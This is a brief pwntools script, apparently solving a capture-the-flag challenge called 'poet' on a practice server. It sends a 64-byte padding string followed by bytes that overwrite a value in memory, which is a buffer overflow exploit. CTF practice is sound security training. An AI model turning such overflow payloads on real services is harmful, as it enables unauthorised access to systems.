from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3012)
#p = process('./poet')
sleep(0.5)
print p.recv()	# poem
p.sendline('a')

print p.recv()
p.sendline('a'*64+"\x40\x42\x0f")

print p.recv()
print 'end !'
